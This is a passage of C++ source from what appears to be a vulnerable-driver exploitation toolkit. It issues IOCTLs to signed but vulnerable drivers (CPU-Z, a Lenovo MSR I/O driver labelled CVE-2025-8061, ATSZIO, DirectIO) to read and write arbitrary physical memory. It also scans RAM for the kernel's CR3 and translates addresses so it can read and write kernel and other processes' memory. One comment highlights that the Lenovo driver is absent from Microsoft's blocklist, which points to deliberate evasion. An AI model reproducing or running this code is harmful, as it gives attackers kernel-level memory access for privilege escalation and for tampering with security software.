    return DeviceIoControl(dev, IOCTL_CPUZ_READ_PHYS,
        &input, sizeof(input), out, sizeof(out), &returned, nullptr) != FALSE;
}

static DWORD CPUZ_ReadPhys32(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    if (!PhysAddrInRAM(physAddr, 4))
        return 0;
    DWORD val = 0;
    if (!CPUZ_ReadPhysBuf(dev, physAddr, &val, 4))
        return 0;
    return val;
}

static DWORD64 CPUZ_ReadPhys64(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    DWORD lo = CPUZ_ReadPhys32(dev, physAddr, forPT);
    DWORD hi = CPUZ_ReadPhys32(dev, physAddr + 4, forPT);
    return ((DWORD64)hi << 32) | lo;
}

static bool CPUZ_WritePhys32(HANDLE dev, DWORD64 physAddr, DWORD value) {
    if (physAddr > 0xFFFFFFFFULL) return false;
    if (!PhysAddrInRAM(physAddr, 4))
        return false;
    DWORD pageBase = (DWORD)(physAddr & 0xFFFFF000ULL);
    DWORD checkVal = 0;
    if (!CPUZ_ReadPhysBuf(dev, pageBase, &checkVal, 4))
        return false;
    CPUZWriteInput input = {};
    input.phys_addr   = (DWORD)physAddr;
    input.check_value = checkVal;
    input.write_value = value;
    DWORD result = 0;
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_CPUZ_WRITE_PHYS,
        &input, sizeof(input), &result, sizeof(result), &returned, nullptr))
        return false;
    return result == 1;
}

static bool CPUZ_WritePhys64(HANDLE dev, DWORD64 physAddr, DWORD64 value) {
    if (!CPUZ_WritePhys32(dev, physAddr, (DWORD)(value & 0xFFFFFFFF)))
        return false;
    return CPUZ_WritePhys32(dev, physAddr + 4, (DWORD)(value >> 32));
}

static DWORD64 CPUZ_VirtToPhys4(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml4e = CPUZ_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = CPUZ_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = CPUZ_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = CPUZ_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 CPUZ_VirtToPhys5(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml5e = CPUZ_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 48) & 0x1FF) * 8), true);
    if (!(pml5e & 1)) return 0;
    DWORD64 pml4e = CPUZ_ReadPhys64(dev, (pml5e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = CPUZ_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = CPUZ_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = CPUZ_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 CPUZ_VirtToPhys(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr, bool la57) {
    if (la57)
        return CPUZ_VirtToPhys5(dev, cr3, virtAddr);
    return CPUZ_VirtToPhys4(dev, cr3, virtAddr);
}

static DWORD64 CPUZ_FindSystemCR3(HANDLE dev, DWORD64 knownKernelBase, bool& outLa57) {
    InitPhysRAMMap();
    LNVMSRIO_Log("[CPUZ] CR3 scan: kBase=0x%llX ramRanges=%d scanLimit=0x%llX\n",
        (unsigned long long)knownKernelBase, g_physRamCount, (unsigned long long)GetCR3ScanLimit());
    if (g_physRamCount <= 0) { outLa57 = false; return 0; }

    DWORD64 sanityAddr = (g_physRamCount > 0) ? g_physRam[0].start : 0x1000;
    DWORD sanity = CPUZ_ReadPhys32(dev, sanityAddr);
    LNVMSRIO_Log("[CPUZ] Sanity read phys 0x%llX = 0x%08X\n",
        (unsigned long long)sanityAddr, sanity);

    DWORD64 kPml4Idx = (knownKernelBase >> 39) & 0x1FFULL;
    DWORD64 kPdptIdx = (knownKernelBase >> 30) & 0x1FFULL;
    LNVMSRIO_Log("[CPUZ] Using PML4 index 0x%llX\n", (unsigned long long)kPml4Idx);

    int pml4Hits = 0, pdptHits = 0, vtpHits = 0;
    for (int ri = 0; ri < g_physRamCount; ri++) {
        DWORD64 rangeStart = (g_physRam[ri].start + 0xFFF) & ~0xFFFULL;
        if (rangeStart < 0x1000) rangeStart = 0x1000;
        LNVMSRIO_Log("[CPUZ] Scanning range[%d] 0x%llX-0x%llX\n",
            ri, (unsigned long long)rangeStart, (unsigned long long)g_physRam[ri].end);
        for (DWORD64 candidate = rangeStart; candidate < g_physRam[ri].end; candidate += 0x1000) {
            DWORD64 kEntry = CPUZ_ReadPhys64(dev, candidate + kPml4Idx * 8);
            if (!(kEntry & 1)) continue;
            DWORD64 kFrame = kEntry & 0x000FFFFFFFFFF000ULL;
            if (!kFrame || !PhysAddrInRAM(kFrame, 0x1000)) continue;
            pml4Hits++;
            DWORD64 pdptEntry = CPUZ_ReadPhys64(dev, kFrame + kPdptIdx * 8);
            if (!(pdptEntry & 1)) continue;
            DWORD64 pdptFrame = pdptEntry & 0x000FFFFFFFFFF000ULL;
            if (!(pdptEntry & 0x80) && (!pdptFrame || !PhysAddrInRAM(pdptFrame, 0x1000))) continue;
            pdptHits++;
            DWORD64 phys = CPUZ_VirtToPhys4(dev, candidate, knownKernelBase);
            if (!phys)
                phys = CPUZ_VirtToPhys5(dev, candidate, knownKernelBase);
            if (!phys) continue;
            vtpHits++;
            if (!PhysAddrInRAM(phys, 4)) continue;
            DWORD mz = CPUZ_ReadPhys32(dev, phys);
            LNVMSRIO_Log("[CPUZ] candidate=0x%llX phys=0x%llX mz=0x%04X\n",
                (unsigned long long)candidate, (unsigned long long)phys, mz & 0xFFFF);
            if ((mz & 0xFFFF) == 0x5A4D) {
                if (CPUZ_VirtToPhys4(dev, candidate, knownKernelBase) != 0) {
                    outLa57 = false;
                    LNVMSRIO_Log("[CPUZ] CR3 FOUND: 0x%llX la57=0\n", (unsigned long long)candidate);
                    return candidate;
                }
                DWORD64 vtp5Idx = (knownKernelBase >> 48) & 0x1FFULL;
                DWORD64 pml5eVal = CPUZ_ReadPhys64(dev, (candidate & ~0xFFFULL) | (vtp5Idx * 8));
                DWORD64 extractedPml4 = pml5eVal & 0x000FFFFFFFFFF000ULL;
                LNVMSRIO_Log("[CPUZ] VTP4 failed, extracting VTP5 PML4: frame=0x%llX\n",
                    (unsigned long long)extractedPml4);
                if (extractedPml4 && extractedPml4 != (candidate & ~0xFFFULL)) {
                    DWORD64 extPhys = CPUZ_VirtToPhys4(dev, extractedPml4, knownKernelBase);
                    if (extPhys) {
                        DWORD extMz = CPUZ_ReadPhys32(dev, extPhys);
                        if ((extMz & 0xFFFF) == 0x5A4D) {
                            outLa57 = false;
                            LNVMSRIO_Log("[CPUZ] CR3 FOUND (extracted kernel PML4): 0x%llX la57=0\n",
                                (unsigned long long)extractedPml4);
                            return extractedPml4;
                        }
                    }
                }
                outLa57 = true;
                LNVMSRIO_Log("[CPUZ] CR3 FOUND (fallback): 0x%llX la57=1\n", (unsigned long long)candidate);
                return candidate;
            }
        }
    }
    LNVMSRIO_Log("[CPUZ] CR3 FAILED: pml4Hits=%d pdptHits=%d vtpHits=%d\n", pml4Hits, pdptHits, vtpHits);
    outLa57 = false;
    return 0;
}

// ============================================================================
// LnvMSRIO backend — physical memory R/W via Lenovo MSR I/O (CVE-2025-8061)
// Signed by Lenovo/DigiCert, NOT on Microsoft Vulnerable Driver Blocklist.
// ============================================================================

#define LNVMSRIO_DEVICE_STRING   "\\\\.\\WinMsrDev"
#define IOCTL_LNVMSRIO_READ_PHYS  0x9C406104
#define IOCTL_LNVMSRIO_WRITE_PHYS 0x9C40A108


// Input header — MUST be exactly 16 bytes for reads, >= 16 for writes.
// OperationType: 1=byte, 2=word, 8=qword (driver has NO dword/4 case).
// Read output goes to a SEPARATE output buffer starting at offset 0.
// Write data is appended after this header (offset 16+).
#pragma pack(push, 1)
struct LnvMSRIOInput {
    UINT64 PhysicalAddress;
    ULONG  OperationType;
    ULONG  HowMuch;
};
#pragma pack(pop)

static HANDLE LNVMSRIO_OpenDevice() {
    return CreateFileA(LNVMSRIO_DEVICE_STRING, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);
}

// RAM range data uses shared g_physRam/g_physRamCount (declared above)

static void InitPhysRAMMap() {
    if (g_physRamCount >= 0) return;
    g_physRamCount = 0;
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return;
    DWORD sz = 0;
    if (RegQueryValueExW(hKey, L".Translated", nullptr, nullptr, nullptr, &sz) != ERROR_SUCCESS || !sz) {
        RegCloseKey(hKey); return;
    }
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!buf) { RegCloseKey(hKey); return; }
    if (RegQueryValueExW(hKey, L".Translated", nullptr, nullptr, buf, &sz) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, buf); RegCloseKey(hKey); return;
    }
    RegCloseKey(hKey);
    // Parse CM_RESOURCE_LIST binary layout (kernel structs not available in UM):
    //   [0]  DWORD Count
    //   [4]  CM_FULL_RESOURCE_DESCRIPTOR[0]:
    //     [4]  DWORD InterfaceType
    //     [8]  DWORD BusNumber
    //     [12] USHORT Version
    //     [14] USHORT Revision
    //     [16] DWORD PartialCount
    //     [20] CM_PARTIAL_RESOURCE_DESCRIPTOR[0..n] — each 20 bytes on x64:
    //       +0  UCHAR  Type  (3=Memory, 7=MemoryLarge)
    //       +2  USHORT Flags
    //       +4  LONGLONG Start (physical address)
    //       +12 ULONG  Length
    if (sz < 24) { HeapFree(GetProcessHeap(), 0, buf); return; }
    DWORD listCount = *(DWORD*)(buf);
    if (listCount < 1) { HeapFree(GetProcessHeap(), 0, buf); return; }
    DWORD partialCount = *(DWORD*)(buf + 16);
    const DWORD descSz = 20;
    for (DWORD i = 0; i < partialCount && g_physRamCount < 128; i++) {
        DWORD off = 20 + i * descSz;
        if (off + descSz > sz) break;
        UCHAR  type  = buf[off];
        USHORT flags = *(USHORT*)(buf + off + 2);
        DWORD64 start = (DWORD64)*(LONGLONG*)(buf + off + 4);
        DWORD   rawLen = *(DWORD*)(buf + off + 12);
        DWORD64 len = 0;
        if (type == 3)      len = (DWORD64)rawLen;
        else if (type == 7) {
            DWORD64 r = (DWORD64)rawLen;
            if (flags & 0x0200)      len = r << 8;
            else if (flags & 0x0400) len = r << 16;
            else if (flags & 0x0800) len = r << 24;
        }
        if (len > 0) {
            g_physRam[g_physRamCount].start = start;
            g_physRam[g_physRamCount].end = start + len;
            g_physRamCount++;
        }
    }
    HeapFree(GetProcessHeap(), 0, buf);
    LNVMSRIO_Log("RAM ranges found: %d\n", g_physRamCount);
    for (int i = 0; i < g_physRamCount; i++)
        LNVMSRIO_Log("  [%d] 0x%llX - 0x%llX\n", i, g_physRam[i].start, g_physRam[i].end);
}

static bool PhysAddrInRAM(DWORD64 addr, DWORD size) {
    if (g_physRamCount <= 0) return false;
    if (addr > 0x40000000000ULL) return false;
    for (int i = 0; i < g_physRamCount; i++)
        if (addr >= g_physRam[i].start && addr + size <= g_physRam[i].end)
            return true;
    return false;
}

static bool PhysAddrBelowMax(DWORD64 addr, DWORD size) {
    if (!addr) return false;
    if (!g_maxPhysAddr) {
        InitPhysRAMMap();
        for (int i = 0; i < g_physRamCount; i++) {
            if (g_physRam[i].end > g_maxPhysAddr)
                g_maxPhysAddr = g_physRam[i].end;
        }
        if (!g_maxPhysAddr) g_maxPhysAddr = 0x100000000ULL;
        LNVMSRIO_Log("g_maxPhysAddr = 0x%llX\n", (unsigned long long)g_maxPhysAddr);
    }
    return (addr + size) <= g_maxPhysAddr;
}

static DWORD64 GetCR3ScanLimit() {
    DWORD64 limit = 0x10000000ULL; // 256MB minimum
    for (int i = 0; i < g_physRamCount; i++) {
        if (g_physRam[i].end > limit)
            limit = g_physRam[i].end;
    }
    return limit;
}

static DWORD LNVMSRIO_ReadPhys32(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    if (!PhysAddrInRAM(physAddr, 4))
        return 0;
    LnvMSRIOInput input = {};
    input.PhysicalAddress = physAddr;
    input.OperationType = 1;
    input.HowMuch = 4;
    DWORD result = 0;
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_LNVMSRIO_READ_PHYS,
        &input, sizeof(input), &result, sizeof(result), &returned, nullptr))
        return 0;
    return result;
}

static DWORD64 LNVMSRIO_ReadPhys64(HANDLE dev, DWORD64 physAddr, bool forPT = false) {
    DWORD lo = LNVMSRIO_ReadPhys32(dev, physAddr, forPT);
    DWORD hi = LNVMSRIO_ReadPhys32(dev, physAddr + 4, forPT);
    return ((DWORD64)hi << 32) | lo;
}

static bool LNVMSRIO_WritePhys32(HANDLE dev, DWORD64 physAddr, DWORD value) {
    if (!PhysAddrInRAM(physAddr, 4))
        return false;
    struct { LnvMSRIOInput hdr; BYTE data[4]; } input = {};
    input.hdr.PhysicalAddress = physAddr;
    input.hdr.OperationType = 1;
    input.hdr.HowMuch = 4;
    memcpy(input.data, &value, 4);
    DWORD returned = 0;
    return DeviceIoControl(dev, IOCTL_LNVMSRIO_WRITE_PHYS,
        &input, sizeof(input), nullptr, 0, &returned, nullptr) != FALSE;
}

static bool LNVMSRIO_WritePhys64(HANDLE dev, DWORD64 physAddr, DWORD64 value) {
    if (!LNVMSRIO_WritePhys32(dev, physAddr, (DWORD)(value & 0xFFFFFFFF)))
        return false;
    return LNVMSRIO_WritePhys32(dev, physAddr + 4, (DWORD)(value >> 32));
}

static DWORD64 LNVMSRIO_VirtToPhys4(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml4e = LNVMSRIO_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = LNVMSRIO_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = LNVMSRIO_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = LNVMSRIO_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 LNVMSRIO_VirtToPhys5(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr) {
    DWORD64 pml5e = LNVMSRIO_ReadPhys64(dev, (cr3 & ~0xFFFULL) | (((virtAddr >> 48) & 0x1FF) * 8), true);
    if (!(pml5e & 1)) return 0;
    DWORD64 pml4e = LNVMSRIO_ReadPhys64(dev, (pml5e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 39) & 0x1FF) * 8), true);
    if (!(pml4e & 1)) return 0;
    DWORD64 pdpte = LNVMSRIO_ReadPhys64(dev, (pml4e & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 30) & 0x1FF) * 8), true);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0x000FFFFFC0000000ULL) | (virtAddr & 0x3FFFFFFFULL);
    DWORD64 pde = LNVMSRIO_ReadPhys64(dev, (pdpte & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 21) & 0x1FF) * 8), true);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0x000FFFFFFFE00000ULL) | (virtAddr & 0x1FFFFFULL);
    DWORD64 pte = LNVMSRIO_ReadPhys64(dev, (pde & 0x000FFFFFFFFFF000ULL) | (((virtAddr >> 12) & 0x1FF) * 8), true);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (virtAddr & 0xFFFULL);
}

static DWORD64 LNVMSRIO_VirtToPhys(HANDLE dev, DWORD64 cr3, DWORD64 virtAddr, bool la57) {
    if (la57)
        return LNVMSRIO_VirtToPhys5(dev, cr3, virtAddr);
    return LNVMSRIO_VirtToPhys4(dev, cr3, virtAddr);
}

static DWORD64 LNVMSRIO_FindSystemCR3(HANDLE dev, DWORD64 knownKernelBase, bool& outLa57) {
    InitPhysRAMMap();
    LNVMSRIO_Log("CR3 scan start, knownKernelBase=0x%llX, ramRanges=%d\n",
        (unsigned long long)knownKernelBase, g_physRamCount);
    if (g_physRamCount <= 0) {
        LNVMSRIO_Log("CR3 scan ABORT: no RAM ranges\n");
        outLa57 = false;
        return 0;
    }

    DWORD64 kPml4Idx = (knownKernelBase >> 39) & 0x1FFULL;
    DWORD64 kPdptIdx = (knownKernelBase >> 30) & 0x1FFULL;
    LNVMSRIO_Log("Using PML4 index 0x%llX\n", (unsigned long long)kPml4Idx);

    int pml4Hits = 0, pdptHits = 0, vtpHits = 0;
    for (int ri = 0; ri < g_physRamCount; ri++) {
        DWORD64 rangeStart = (g_physRam[ri].start + 0xFFF) & ~0xFFFULL;
        if (rangeStart < 0x1000) rangeStart = 0x1000;
        LNVMSRIO_Log("Scanning range[%d] 0x%llX-0x%llX\n",
            ri, (unsigned long long)rangeStart, (unsigned long long)g_physRam[ri].end);
        for (DWORD64 candidate = rangeStart; candidate < g_physRam[ri].end; candidate += 0x1000) {
            DWORD64 kEntry = LNVMSRIO_ReadPhys64(dev, candidate + kPml4Idx * 8);
            if (!(kEntry & 1)) continue;
            DWORD64 kFrame = kEntry & 0x000FFFFFFFFFF000ULL;
            if (!kFrame || !PhysAddrInRAM(kFrame, 0x1000)) continue;
            pml4Hits++;
            DWORD64 pdptEntry = LNVMSRIO_ReadPhys64(dev, kFrame + kPdptIdx * 8);
            if (!(pdptEntry & 1)) continue;
            DWORD64 pdptFrame = pdptEntry & 0x000FFFFFFFFFF000ULL;
            if (!(pdptEntry & 0x80) && (!pdptFrame || !PhysAddrInRAM(pdptFrame, 0x1000))) continue;
            pdptHits++;

            DWORD64 phys = LNVMSRIO_VirtToPhys4(dev, candidate, knownKernelBase);
            if (!phys)
                phys = LNVMSRIO_VirtToPhys5(dev, candidate, knownKernelBase);
            if (!phys) continue;
            vtpHits++;

            if (!PhysAddrInRAM(phys, 4)) continue;
            DWORD mz = LNVMSRIO_ReadPhys32(dev, phys);
            if ((mz & 0xFFFF) == 0x5A4D) {
                if (LNVMSRIO_VirtToPhys4(dev, candidate, knownKernelBase) != 0) {
                    outLa57 = false;
                    LNVMSRIO_Log("CR3 FOUND: 0x%llX la57=0\n", (unsigned long long)candidate);
                    return candidate;
                }
                DWORD64 vtp5Idx = (knownKernelBase >> 48) & 0x1FFULL;
                DWORD64 pml5eVal = LNVMSRIO_ReadPhys64(dev, (candidate & ~0xFFFULL) | (vtp5Idx * 8));
                DWORD64 extractedPml4 = pml5eVal & 0x000FFFFFFFFFF000ULL;
                LNVMSRIO_Log("VTP4 failed, extracting VTP5 PML4: frame=0x%llX\n",
                    (unsigned long long)extractedPml4);
                if (extractedPml4 && extractedPml4 != (candidate & ~0xFFFULL)) {
                    DWORD64 extPhys = LNVMSRIO_VirtToPhys4(dev, extractedPml4, knownKernelBase);
                    if (extPhys) {
                        DWORD extMz = LNVMSRIO_ReadPhys32(dev, extPhys);
                        if ((extMz & 0xFFFF) == 0x5A4D) {
                            outLa57 = false;
                            LNVMSRIO_Log("CR3 FOUND (extracted kernel PML4): 0x%llX la57=0\n",
                                (unsigned long long)extractedPml4);
                            return extractedPml4;
                        }
                    }
                }
                outLa57 = true;
                LNVMSRIO_Log("CR3 FOUND (fallback): 0x%llX la57=1\n", (unsigned long long)candidate);
                return candidate;
            }
        }
    }
    LNVMSRIO_Log("CR3 scan FAILED: pml4Hits=%d pdptHits=%d vtpHits=%d\n", pml4Hits, pdptHits, vtpHits);
    outLa57 = false;
    return 0;
}

// ============================================================================
// Unified read/write dispatchers
// ============================================================================

static DWORD64 Read64(const Context& ctx, DWORD64 addr) {
    if (ctx.type != Backend::GIO && (!ctx.cr3 || (ctx.cr3 & 0xFFF)))
        return 0;
    switch (ctx.type) {
    case Backend::GIO:
        return GIO_Read64(ctx.device, addr);
    case Backend::LNVMSRIO: {
        DWORD64 phys = LNVMSRIO_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return 0;
        return LNVMSRIO_ReadPhys64(ctx.device, phys);
    }
    case Backend::ATSZIO: {
        DWORD64 phys = ATSZIO_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return 0;
        return ATSZIO_ReadPhys64(ctx.device, phys);
    }
    case Backend::DIRECTIO: {
        DWORD64 phys = DIRECTIO_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return 0;
        return DIRECTIO_ReadPhys64(ctx.device, phys);
    }
    case Backend::CPUZ: {
        DWORD64 phys = CPUZ_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return 0;
        return CPUZ_ReadPhys64(ctx.device, phys);
    }
    default:
        return 0;
    }
}

static bool Write64(const Context& ctx, DWORD64 addr, DWORD64 value) {
    if (ctx.type != Backend::GIO && (!ctx.cr3 || (ctx.cr3 & 0xFFF)))
        return false;
    switch (ctx.type) {
    case Backend::GIO:
        return GIO_Write64(ctx.device, addr, value);
    case Backend::LNVMSRIO: {
        DWORD64 phys = LNVMSRIO_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return false;
        return LNVMSRIO_WritePhys64(ctx.device, phys, value);
    }
    case Backend::ATSZIO: {
        DWORD64 phys = ATSZIO_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return false;
        return ATSZIO_WritePhys64(ctx.device, phys, value);
    }
    case Backend::DIRECTIO: {
        DWORD64 phys = DIRECTIO_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return false;
        return DIRECTIO_WritePhys64(ctx.device, phys, value);
    }
    case Backend::CPUZ: {
        DWORD64 phys = CPUZ_VirtToPhys(ctx.device, ctx.cr3, addr, ctx.la57);
        if (!phys) return false;
        return CPUZ_WritePhys64(ctx.device, phys, value);
    }
    default:
        return false;
    }
}

// ============================================================================
// Unified virtual-to-physical translation and page-aware bulk R/W
// These support any CR3, enabling cross-process physical memory reads.
// ============================================================================

struct PTCacheEntry {
    DWORD64 cr3 = 0;
    DWORD64 vpn = 0;
    DWORD64 physBase = 0;
    DWORD   gen = 0;
};
static constexpr int PT_CACHE_SIZE = 256;
static constexpr int PT_CACHE_MASK = PT_CACHE_SIZE - 1;
inline PTCacheEntry g_ptCache[PT_CACHE_SIZE] = {};
inline DWORD g_ptCacheGen = 1;
inline ULONGLONG g_ptCacheLastFlush = 0;
inline volatile LONG g_ptCacheLock = 0;

static inline void PTCacheLock() {
    while (InterlockedExchange(&g_ptCacheLock, 1) != 0)
        YieldProcessor();
}
static inline void PTCacheUnlock() {
    InterlockedExchange(&g_ptCacheLock, 0);
}

static void FlushPTCacheIfStale() {
    ULONGLONG now = GetTickCount64();
    PTCacheLock();
    if (now - g_ptCacheLastFlush > 2000) {
        g_ptCacheGen++;
        g_ptCacheLastFlush = now;
    }
    PTCacheUnlock();
}

static DWORD64 VirtToPhys(const Context& ctx, DWORD64 virtAddr) {
    DWORD64 vpn = virtAddr >> 12;
    int idx = (int)((vpn * 2654435761ULL) & PT_CACHE_MASK);

    PTCacheLock();
    auto& ce = g_ptCache[idx];
    if (ce.gen == g_ptCacheGen && ce.cr3 == ctx.cr3 && ce.vpn == vpn) {
        DWORD64 result = ce.physBase | (virtAddr & 0xFFF);
        PTCacheUnlock();
        return result;
    }
    PTCacheUnlock();

    DWORD64 phys = 0;
    switch (ctx.type) {
    case Backend::ATSZIO:   phys = ATSZIO_VirtToPhys(ctx.device, ctx.cr3, virtAddr, ctx.la57); break;
    case Backend::DIRECTIO: phys = DIRECTIO_VirtToPhys(ctx.device, ctx.cr3, virtAddr, ctx.la57); break;
    case Backend::CPUZ:     phys = CPUZ_VirtToPhys(ctx.device, ctx.cr3, virtAddr, ctx.la57); break;
    case Backend::LNVMSRIO: phys = LNVMSRIO_VirtToPhys(ctx.device, ctx.cr3, virtAddr, ctx.la57); break;
    default: return 0;
    }
    if (phys) {
        PTCacheLock();
        ce.cr3 = ctx.cr3;
        ce.vpn = vpn;
        ce.physBase = phys & ~0xFFFULL;
        ce.gen = g_ptCacheGen;
        PTCacheUnlock();
    }
    return phys;
}

// DirectIO optimized bulk physical read — maps page once, copies entire chunk
static bool DIRECTIO_ReadPhysBuf(HANDLE dev, DWORD64 physAddr, void* dest, DWORD size) {
    if (!size) return true;
    if (!PhysAddrInRAM(physAddr, size)) return false;
    BYTE buf[0x3D] = {};
    *(DWORD*)(buf + 0x18) = 0x1000;
    *(DWORD64*)(buf + 0x1C) = physAddr & ~0xFFFULL;
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_DIRECTIO_MAP_PHYS,
        buf, sizeof(buf), buf, sizeof(buf), &returned, nullptr))
        return false;
    DWORD64 userVA = *(DWORD64*)(buf + 0x24);
    if (!userVA) {
        DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
        return false;
    }
    bool ok = true;
    __try { memcpy(dest, (void*)((ULONG_PTR)userVA + (physAddr & 0xFFF)), size); }
    __except(EXCEPTION_EXECUTE_HANDLER) { ok = false; }
    DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
    return ok;
}

// DirectIO optimized bulk physical write — maps page once in write mode
static bool DIRECTIO_WritePhysBuf(HANDLE dev, DWORD64 physAddr, const void* src, DWORD size) {
    if (!size) return true;
    if (!PhysAddrInRAM(physAddr, size)) return false;
    BYTE buf[0x3D] = {};
    *(DWORD*)(buf + 0x18) = 0x1000;
    *(DWORD64*)(buf + 0x1C) = physAddr & ~0xFFFULL;
    buf[0x2C] = 1;
    DWORD returned = 0;
    if (!DeviceIoControl(dev, IOCTL_DIRECTIO_MAP_PHYS,
        buf, sizeof(buf), buf, sizeof(buf), &returned, nullptr))
        return false;
    DWORD64 userVA = *(DWORD64*)(buf + 0x24);
    if (!userVA) {
        DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
        return false;
    }
    bool ok = true;
    __try { memcpy((void*)((ULONG_PTR)userVA + (physAddr & 0xFFF)), src, size); }
    __except(EXCEPTION_EXECUTE_HANDLER) { ok = false; }
    DeviceIoControl(dev, IOCTL_DIRECTIO_UNMAP_PHYS, buf, sizeof(buf), nullptr, 0, &returned, nullptr);
    return ok;
}

static bool ReadPhysBuf(const Context& ctx, DWORD64 physAddr, void* dest, DWORD size) {
    if (!size) return true;
    switch (ctx.type) {
    case Backend::CPUZ:
        return CPUZ_ReadPhysBuf(ctx.device, physAddr, dest, size);
    case Backend::DIRECTIO:
        return DIRECTIO_ReadPhysBuf(ctx.device, physAddr, dest, size);
    case Backend::ATSZIO: {
        uint8_t* p = (uint8_t*)dest;
        DWORD off = 0;
        while (off + 4 <= size) {
            DWORD val = ATSZIO_ReadPhys32(ctx.device, physAddr + off);
            memcpy(p + off, &val, 4);
            off += 4;
        }
        if (off < size) {
            DWORD val = ATSZIO_ReadPhys32(ctx.device, physAddr + off);
            memcpy(p + off, &val, size - off);
        }
        return true;
    }
    case Backend::LNVMSRIO: {
        uint8_t* p = (uint8_t*)dest;
        DWORD off = 0;
        while (off + 4 <= size) {
            DWORD val = LNVMSRIO_ReadPhys32(ctx.device, physAddr + off);
            memcpy(p + off, &val, 4);
            off += 4;
        }
        if (off < size) {
